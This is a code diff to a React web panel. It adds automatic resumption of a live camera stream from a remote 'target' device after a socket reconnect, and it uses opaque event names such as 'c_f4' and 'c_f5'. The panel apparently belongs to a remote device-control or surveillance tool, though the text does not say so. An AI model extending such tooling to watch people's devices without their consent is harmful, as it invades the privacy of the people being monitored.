@@ -384,6 +384,11 @@ export default function Home() {
     const [isRecording, setIsRecording] = useState(false);
     const [isLiveStreaming, setIsLiveStreaming] = useState(false);
     const [liveFrame, setLiveFrame] = useState<string | null>(null);
+    // Refs for socket reconnect resume
+    const isLiveStreamingRef = React.useRef(false);
+    const selectedDeviceIdRef = React.useRef<string | null>(null);
+    const cameraModeRef = React.useRef<'front' | 'back'>('back');
+    const cameraQualityRef = React.useRef<number>(360);
     const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
     const [recordingDuration, setRecordingDuration] = useState<number>(0);
     const [capturedMedia, setCapturedMedia] = useState<any[]>([]);
@@ -513,6 +518,19 @@ export default function Home() {
             socket.on("connect", () => {
                 console.log("[Socket] Connected/Reconnected, registering web...");
                 socket.emit("register_web", { uuid });
+
+                // Auto-resume live stream agar socket reconnect hua aur stream chal rahi thi
+                if (isLiveStreamingRef.current && selectedDeviceIdRef.current) {
+                    console.log("[Socket] Reconnected while streaming — resuming stream...");
+                    setTimeout(() => {
+                        socket.emit('c_f4', {
+                            uuid,
+                            targetDeviceId: selectedDeviceIdRef.current,
+                            camera: cameraModeRef.current,
+                            quality: cameraQualityRef.current
+                        });
+                    }, 1500); // Server ke register hone ka wait karo
+                }
 
                 const now = Date.now();
                 if (now - lastConnectFetch < 10000) return;
@@ -1970,10 +1988,16 @@ END:VCARD`;
                                             if (isLiveStreaming) {
                                                 socket?.emit('c_f5', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                 setIsLiveStreaming(false);
+                                                isLiveStreamingRef.current = false;
                                             } else {
                                                 socket?.emit('c_f4', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: cameraQuality });
                                                 setIsLiveStreaming(true);
                                                 setLiveFrame(null);
+                                                // Refs update karo reconnect ke liye
+                                                isLiveStreamingRef.current = true;
+                                                selectedDeviceIdRef.current = selectedDeviceId ?? null;
+                                                cameraModeRef.current = cameraMode;
+                                                cameraQualityRef.current = cameraQuality;
                                             }
                                         }}
                                         className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 ${isLiveStreaming ? 'bg-red-500 text-white' : 'bg-white/5 text-white/70 border border-white/5'}`}
